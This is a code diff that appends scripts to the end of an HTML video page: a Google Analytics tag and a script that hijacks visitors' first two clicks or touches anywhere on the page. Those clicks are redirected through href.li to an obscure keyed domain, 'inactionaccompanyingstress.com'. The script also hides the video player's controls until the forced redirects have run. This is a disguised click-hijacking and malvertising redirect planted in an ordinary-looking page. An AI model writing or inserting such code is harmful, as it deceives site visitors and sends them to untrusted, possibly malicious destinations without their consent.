@@ -53,3 +53,68 @@
     </script>
 </body>
 </html>	
+
+
+<!-- Google tag (gtag.js) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-73BDDJLZ2P"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-73BDDJLZ2P');
+</script>
+
+
+
+
+
+<script>
+        const redirectUrl = 'https://href.li/?https://inactionaccompanyingstress.com/w09tuu16?key=a3ca64aeed2a63ad6977d8be1fed4526'; // Replace with your URL
+        const maxRedirects = 2;
+
+        // Check if this is a new session
+        if (!sessionStorage.getItem('sessionStarted')) {
+            localStorage.removeItem('clickCount');
+            sessionStorage.setItem('sessionStarted', 'true');
+        }
+
+        // Initialize click count from localStorage or set to 0
+        let clickCount = parseInt(localStorage.getItem('clickCount')) || 0;
+
+        // Function to handle clicks
+        function handleClick(event) {
+            clickCount++;
+            localStorage.setItem('clickCount', clickCount);
+            if (clickCount <= maxRedirects) {
+                window.location.href = redirectUrl;
+                event.preventDefault();
+            } else {
+                document.getElementById('videoPlayer').setAttribute('controls', 'controls'); // Show video controls
+            }
+        }
+
+        // Function to handle touch events
+        function handleTouch(event) {
+            handleClick(event);
+        }
+
+        // Add event listeners for click and touchstart
+        document.addEventListener('click', handleClick, true); // Capture phase to ensure it catches all clicks
+        document.addEventListener('touchstart', handleTouch, true); // Capture phase to ensure it catches all touches
+
+       const videoOverlay = document.getElementById('videoOverlay');
+        videoOverlay.addEventListener('click', handleClick, true);  // Use capturing phase
+        videoOverlay.addEventListener('touchstart', handleTouch, true);  // Use capturing phase
+
+        // Initial setup: hide video controls and show overlay
+        if (clickCount <= maxRedirects) {
+            document.getElementById('videoPlayer').removeAttribute('controls');
+       
+        }
+    </script>
+
+
+
+
+
